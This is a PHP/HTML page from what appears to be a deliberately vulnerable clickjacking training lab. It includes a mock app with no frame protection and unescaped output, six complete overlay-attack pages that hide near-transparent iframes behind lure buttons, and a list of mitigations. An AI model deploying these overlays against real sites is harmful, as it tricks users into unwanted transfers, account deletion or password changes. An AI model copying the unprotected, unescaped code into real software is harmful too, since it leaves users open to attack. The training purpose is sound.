<?php
// Lab 1: Basic Clickjacking
// Vulnerability: Basic clickjacking attacks

session_start();

$message = '';
$action_performed = '';

// Simulate user actions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    
    switch ($action) {
        case 'like_post':
            $action_performed = 'Post liked successfully!';
            break;
        case 'follow_user':
            $action_performed = 'User followed successfully!';
            break;
        case 'share_content':
            $action_performed = 'Content shared successfully!';
            break;
        case 'delete_account':
            $action_performed = 'Account deletion initiated!';
            break;
        case 'change_password':
            $action_performed = 'Password changed successfully!';
            break;
        case 'transfer_money':
            $amount = $_POST['amount'] ?? 0;
            $to_account = $_POST['to_account'] ?? '';
            $action_performed = "Money transferred successfully! Amount: $" . $amount . " to account: " . $to_account;
            break;
        case 'update_profile':
            $email = $_POST['email'] ?? '';
            $action_performed = "Profile updated successfully! Email: " . $email;
            break;
        case 'admin_action':
            $command = $_POST['command'] ?? '';
            $action_performed = "Admin action executed! Command: " . $command;
            break;
    }
    
    $message = '<div class="alert alert-success">' . $action_performed . '</div>';
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 1: Basic Clickjacking - Clickjacking Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .action-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .clickjacking-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }

        .vulnerable-form {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .action-buttons {
            display: flex;
            gap: 1rem;
            flex-wrap: wrap;
            margin: 1rem 0;
        }

        .action-button {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: 8px;
            color: #1a202c;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .action-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .danger-button {
            background: linear-gradient(90deg, var(--accent-red), var(--accent-orange));
            color: #1a202c;
        }

        .danger-button:hover {
            box-shadow: 0 4px 12px rgba(245, 101, 101, 0.3);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to Clickjacking Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 1: Basic Clickjacking</h1>
            <p class="hero-subtitle">Basic clickjacking attacks</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Low</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates basic clickjacking vulnerabilities where attackers can overlay malicious content on top of legitimate content to trick users into performing unintended actions.</p>
            <p><strong>Objective:</strong> Understand how clickjacking attacks work and how to exploit them.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Application
                    </div>
                    <div class="card-body">
                        <div class="vulnerable-form">
                            <h5>Social Media Platform</h5>
                            <p>Welcome to our social media platform! Here are some actions you can perform:</p>
                            
                            <div class="action-buttons">
                                <button class="action-button" onclick="performAction('like_post')">
                                    <i class="bi bi-heart me-2"></i>Like Post
                                </button>
                                <button class="action-button" onclick="performAction('follow_user')">
                                    <i class="bi bi-person-plus me-2"></i>Follow User
                                </button>
                                <button class="action-button" onclick="performAction('share_content')">
                                    <i class="bi bi-share me-2"></i>Share Content
                                </button>
                            </div>
                            
                            <div class="action-buttons">
                                <button class="action-button danger-button" onclick="performAction('delete_account')">
                                    <i class="bi bi-trash me-2"></i>Delete Account
                                </button>
                                <button class="action-button danger-button" onclick="performAction('change_password')">
                                    <i class="bi bi-key me-2"></i>Change Password
                                </button>
                            </div>
                            
                            <form method="POST" class="mt-3">
                                <input type="hidden" name="action" id="hidden_action" value="">
                                <div class="mb-3">
                                    <label for="amount" class="form-label">Transfer Amount</label>
                                    <input type="number" class="form-control" id="amount" name="amount" value="1000">
                                </div>
                                <div class="mb-3">
                                    <label for="to_account" class="form-label">To Account</label>
                                    <input type="text" class="form-control" id="to_account" name="to_account" value="attacker-account">
                                </div>
                                <button type="submit" class="action-button danger-button" onclick="setAction('transfer_money')">
                                    <i class="bi bi-arrow-right me-2"></i>Transfer Money
                                </button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-mouse me-2"></i>Clickjacking Tester
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="clickjacking-warning">
                            <h5>⚠️ Clickjacking Warning</h5>
                            <p>This lab demonstrates clickjacking vulnerabilities:</p>
                            <ul>
                                <li><code>No X-Frame-Options</code> - Missing frame protection</li>
                                <li><code>No Content Security Policy</code> - Missing CSP frame-ancestors</li>
                                <li><code>No JavaScript protection</code> - No clickjacking detection</li>
                                <li><code>Vulnerable buttons</code> - Action buttons can be overlaid</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Vulnerable Actions</h5>
                            <p>These actions can be exploited via clickjacking:</p>
                            <ul>
                                <li><code>Like Post</code> - Social media manipulation</li>
                                <li><code>Follow User</code> - Unwanted following</li>
                                <li><code>Share Content</code> - Unwanted sharing</li>
                                <li><code>Delete Account</code> - Account deletion</li>
                                <li><code>Change Password</code> - Password changes</li>
                                <li><code>Transfer Money</code> - Financial fraud</li>
                            </ul>
                        </div>
                        
                        <div class="mt-3">
                            <button onclick="testClickjacking()" class="btn btn-primary">Test Clickjacking</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Action Results
                    </div>
                    <div class="card-body">
                        <div class="action-display">
                            <h5>Action Results:</h5>
                            <div id="action-results">No actions performed yet</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Basic Clickjacking</li>
                        <li><strong>Severity:</strong> Medium</li>
                        <li><strong>Method:</strong> Overlay attacks</li>
                        <li><strong>Issue:</strong> Missing frame protection</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Attack Vectors</h5>
                    <ul>
                        <li><strong>Overlay Attacks:</strong> Overlay malicious content</li>
                        <li><strong>Button Manipulation:</strong> Trick users into clicking</li>
                        <li><strong>Form Manipulation:</strong> Manipulate form submissions</li>
                        <li><strong>Social Engineering:</strong> Combine with social engineering</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Basic Clickjacking Examples</h5>
            <p>Use these techniques to exploit clickjacking vulnerabilities:</p>
            
            <h6>1. Basic Overlay Attack:</h6>
            <div class="code-block">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Clickjacking Attack&lt;/title&gt;
    &lt;style&gt;
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 9999;
        }
        .fake-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #007bff;
            color: white;
            padding: 20px 40px;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
        }
        .hidden-iframe {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            height: 200px;
            opacity: 0.1;
            z-index: 10000;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="overlay"&gt;
        &lt;button class="fake-button"&gt;Click here to win $1000!&lt;/button&gt;
        &lt;iframe class="hidden-iframe" src="http://vulnerable-site.com/clickjacking/1.php"&gt;&lt;/iframe&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>2. iframe-based Clickjacking:</h6>
            <div class="code-block">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;iframe Clickjacking&lt;/title&gt;
    &lt;style&gt;
        .container {
            position: relative;
            width: 100%;
            height: 100vh;
        }
        .fake-content {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: white;
            z-index: 1;
        }
        .hidden-iframe {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 200px;
            height: 100px;
            opacity: 0.01;
            z-index: 2;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="container"&gt;
        &lt;div class="fake-content"&gt;
            &lt;h1&gt;🎉 Congratulations! You won a prize!&lt;/h1&gt;
        &lt;/div&gt;
        &lt;iframe class="hidden-iframe" src="http://vulnerable-site.com/clickjacking/1.php"&gt;&lt;/iframe&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>3. CSS-based Clickjacking:</h6>
            <div class="code-block">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;CSS Clickjacking&lt;/title&gt;
    &lt;style&gt;
        .wrapper {
            position: relative;
            width: 100%;
            height: 100vh;
            background: #f0f0f0;
        }
        .fake-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #28a745;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            z-index: 1;
        }
        .hidden-iframe {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 250px;
            height: 150px;
            opacity: 0.01;
            z-index: 2;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="wrapper"&gt;
        &lt;button class="fake-button"&gt;Download Free Software&lt;/button&gt;
        &lt;iframe class="hidden-iframe" src="http://vulnerable-site.com/clickjacking/1.php"&gt;&lt;/iframe&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>4. Advanced Overlay Attack:</h6>
            <div class="code-block">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Advanced Clickjacking&lt;/title&gt;
    &lt;style&gt;
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 9999;
        }
        .fake-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            z-index: 10000;
        }
        .fake-button {
            background: #dc3545;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            margin: 10px;
        }
        .hidden-iframe {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            height: 200px;
            opacity: 0.01;
            z-index: 10001;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="overlay"&gt;
        &lt;div class="fake-content"&gt;
            &lt;h2&gt;⚠️ Security Alert&lt;/h2&gt;
            &lt;p&gt;Your account has been compromised. Click below to secure it.&lt;/p&gt;
            &lt;button class="fake-button"&gt;Secure Account Now&lt;/button&gt;
        &lt;/div&gt;
        &lt;iframe class="hidden-iframe" src="http://vulnerable-site.com/clickjacking/1.php"&gt;&lt;/iframe&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>5. Social Engineering Clickjacking:</h6>
            <div class="code-block">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Social Engineering Clickjacking&lt;/title&gt;
    &lt;style&gt;
        .container {
            position: relative;
            width: 100%;
            height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .fake-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 40px;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            z-index: 1;
        }
        .fake-button {
            background: #28a745;
            color: white;
            padding: 20px 40px;
            border: none;
            border-radius: 8px;
            font-size: 20px;
            cursor: pointer;
            margin: 20px;
        }
        .hidden-iframe {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 350px;
            height: 250px;
            opacity: 0.01;
            z-index: 2;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="container"&gt;
        &lt;div class="fake-content"&gt;
            &lt;h1&gt;🎁 Special Offer!&lt;/h1&gt;
            &lt;p&gt;You've been selected for a special promotion!&lt;/p&gt;
            &lt;p&gt;Click below to claim your reward.&lt;/p&gt;
            &lt;button class="fake-button"&gt;Claim Reward Now&lt;/button&gt;
        &lt;/div&gt;
        &lt;iframe class="hidden-iframe" src="http://vulnerable-site.com/clickjacking/1.php"&gt;&lt;/iframe&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>6. Mobile Clickjacking:</h6>
            <div class="code-block">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Mobile Clickjacking&lt;/title&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;style&gt;
        .mobile-container {
            position: relative;
            width: 100%;
            height: 100vh;
            background: #f8f9fa;
        }
        .fake-app {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 30px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            z-index: 1;
        }
        .fake-button {
            background: #007bff;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            margin: 10px;
        }
        .hidden-iframe {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            height: 200px;
            opacity: 0.01;
            z-index: 2;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="mobile-container"&gt;
        &lt;div class="fake-app"&gt;
            &lt;h2&gt;📱 New App Update&lt;/h2&gt;
            &lt;p&gt;Update available! Tap to install.&lt;/p&gt;
            &lt;button class="fake-button"&gt;Install Update&lt;/button&gt;
        &lt;/div&gt;
        &lt;iframe class="hidden-iframe" src="http://vulnerable-site.com/clickjacking/1.php"&gt;&lt;/iframe&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Social media manipulation and unwanted actions</li>
                <li>Financial fraud and payment manipulation</li>
                <li>Account takeover and password changes</li>
                <li>Settings manipulation and configuration changes</li>
                <li>Compliance violations and security breaches</li>
                <li>Cross-site attacks and data exfiltration</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement X-Frame-Options header (DENY, SAMEORIGIN)</li>
                    <li>Use Content Security Policy (CSP) frame-ancestors directive</li>
                    <li>Implement JavaScript-based clickjacking protection</li>
                    <li>Use SameSite cookie attributes</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual user actions</li>
                    <li>Implement proper authentication and authorization</li>
                    <li>Use CAPTCHA for sensitive actions</li>
                    <li>Implement rate limiting and request validation</li>
                    <li>Educate users about clickjacking attacks</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function performAction(action) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = '';
            
            const actionInput = document.createElement('input');
            actionInput.type = 'hidden';
            actionInput.name = 'action';
            actionInput.value = action;
            
            form.appendChild(actionInput);
            document.body.appendChild(form);
            form.submit();
        }
        
        function setAction(action) {
            document.getElementById('hidden_action').value = action;
        }
        
        function testClickjacking() {
            document.getElementById('action-results').innerHTML = 
                '<div class="alert alert-info">Clickjacking test initiated. Check the vulnerable actions above.</div>';
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
